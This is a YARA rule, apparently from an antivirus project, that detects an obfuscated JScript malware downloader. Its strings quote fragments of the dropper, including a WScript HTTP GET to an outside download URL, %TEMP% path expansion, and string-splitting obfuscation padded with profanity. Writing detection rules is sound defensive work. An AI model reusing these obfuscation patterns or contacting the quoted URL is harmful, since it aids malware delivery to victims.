rule sig_20160428_8ef7b00ee80e1217ddd7d9100f6bcb0f {
  meta:
    description = "datamaliciousorder - file 20160428_8ef7b00ee80e1217ddd7d9100f6bcb0f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "396d55ca1a61d5d73976c068ff74c26eb737b5d67c73e3b0c48306509937ef50"

  strings:
    $s1  = "function ZybOjzQxbJslAleWlcPhw(IqaHvqWuyOzcZjtKpfKpg){TfdAhqCgeMrlEknKcxIpi[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function ZybOjzQxbJslAleWlcPhw(IqaHvqWuyOzcZjtKpfKpg){TfdAhqCgeMrlEknKcxIpi[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function PntFjuWdwWofAgwKyzFia() {return TfdAhqCgeMrlEknKcxIpi[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "return VvbHngDgfWsyDjjYnuCsf - HsqIjbGavErxQogYmoXte;};" fullword ascii
    $s5  = "var TfdAhqCgeMrlEknKcxIpi = function TbkVffSykVgiOpuDatUyz() {return QatOmaUdwThkBwzEofAtp[ZjbGysIdnYpeUtiOweAav](\"WScript\"+\"" ascii
    $s6  = "function MkdKqrFmxMcsLsgGanNkm(VvbHngDgfWsyDjjYnuCsf, HsqIjbGavErxQogYmoXte){ZwzDxnPijPxcWfzGnpEcr = ZwzDxnPijPxcWfzGnpEcr * 1; " ascii
    $s7  = "PdiHmoVmzJocIhiXfmNme[PkhTrvRidOktJjtGjtEuy](\"G\" + \"ET\", \"http://holy.webtm.ru/o4ksla\", false);" fullword ascii
    $s8  = "var QatOmaUdwThkBwzEofAtp = this[\"WScript\"];" fullword ascii
    $s9  = "var TfdAhqCgeMrlEknKcxIpi = function TbkVffSykVgiOpuDatUyz() {return QatOmaUdwThkBwzEofAtp[ZjbGysIdnYpeUtiOweAav](\"WScript\"+\"" ascii
    $s10 = "function PntFjuWdwWofAgwKyzFia() {return TfdAhqCgeMrlEknKcxIpi[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function MkdKqrFmxMcsLsgGanNkm(VvbHngDgfWsyDjjYnuCsf, HsqIjbGavErxQogYmoXte){ZwzDxnPijPxcWfzGnpEcr = ZwzDxnPijPxcWfzGnpEcr * 1; " ascii
    $s12 = "if (PdiHmoVmzJocIhiXfmNme[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function HysIrqAtyUvzCteNmtLkk(){return OquChpVtoJhqXptIpzPkt + \"\";};" fullword ascii
    $s14 = "function XsqLqzEqvZlvAwdQqoByo() {return ((IdxTkcMkvIjpPbdEjwGil == true) && (IdxTkcMkvIjpPbdEjwGil == GvrQumQbwNgrGmwRilBpc)) ?" ascii
    $s15 = "function XsqLqzEqvZlvAwdQqoByo() {return ((IdxTkcMkvIjpPbdEjwGil == true) && (IdxTkcMkvIjpPbdEjwGil == GvrQumQbwNgrGmwRilBpc)) ?" ascii
    $s16 = "return MkdKqrFmxMcsLsgGanNkm(1 == 1 ? JnzNbzNcqWkfRpmCsiNtm : 0, 1 == 1 ? RfkOexOdwTenUenKemGjd : 0);" fullword ascii
    $s17 = "function RccQymOrtKmtQzuOjhAtr(YffYvmXllMgkKhtCffUzg) {var XmfJfkMzaMffIhpSsbZks = (1, 2, 3, 4, 5, YffYvmXllMgkKhtCffUzg); retur" ascii
    $s18 = "var IdxTkcMkvIjpPbdEjwGil = false;" fullword ascii
    $s19 = "var GvrQumQbwNgrGmwRilBpc = false;" fullword ascii
    $s20 = "function ZjiUtgFsmAesEkjDktJvc(){return 23;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}